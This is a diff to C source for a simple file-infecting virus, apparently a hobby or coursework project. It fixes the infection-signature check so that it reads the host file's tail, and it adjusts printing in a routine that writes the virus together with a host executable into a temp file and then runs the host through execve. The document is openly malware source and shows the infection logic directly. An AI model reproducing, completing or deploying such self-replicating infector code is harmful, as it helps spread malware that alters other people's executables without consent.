@@ -76,6 +76,7 @@ void execute(int vfd, mode_t mode, int totalSize, char *argv[], char *const envp
 	if (pid == 0)
 	{
 		execve("../tempfile", argv, envp);
+		printf("\n");
 		exit(1);
 	}
 	waitpid(pid, NULL, 0);
@@ -84,27 +85,27 @@ void execute(int vfd, mode_t mode, int totalSize, char *argv[], char *const envp
 /*This function create a file that will contain the copy of the virus and the host file*/
 void inject(char *host_file, int vfd)
 {
+	/*Open the host file*/
+	int hfd = open(host_file, O_RDONLY);
+	struct stat st;
+	fstat(hfd, &st);
+	int host_size = st.st_size;
 	size_t sig_len = strlen(signature);
 	char sig_check[sig_len + 1];
-	lseek(vfd, sizeof(signature) * -1, SEEK_END);
-	read(vfd, &sig_check, sizeof(signature));
+	lseek(hfd, sizeof(signature) * -1, SEEK_END);
+	read(hfd, &sig_check, sizeof(signature));
 	printf("%s, %s \n ", sig_check, signature);
 	sig_check[sig_len] = '\0';
 	if (strcmp(sig_check, signature) == 0)
 	{
-		printf("Signature matches. Exiting with status 1.\n");
+		printf("Signature matches.\n");
 		return;
 	}
 	else
 	{
 		printf("Signature does not match.\n");
 	}
-	lseek(vfd, 0, SEEK_SET);
-	/*Open the host file*/
-	int hfd = open(host_file, O_RDONLY);
-	struct stat st;
-	fstat(hfd, &st);
-	int host_size = st.st_size;
+	lseek(hfd, 0, SEEK_SET);
 	/*Crate the new file that will have temporary name*/
 	int tfd = creat("/home/atila/temp/tempfile", st.st_mode);
 	/*Inject both codes and signature on it*/
@@ -139,7 +140,7 @@ int main(int argc, char *argv[], char *const envp[])
 			close(vfd);
 		}
 		else
-			printf("not infect");
+			printf("not infect\n\n");
 		free(file_array[i]);
 	}
 	return free_all();
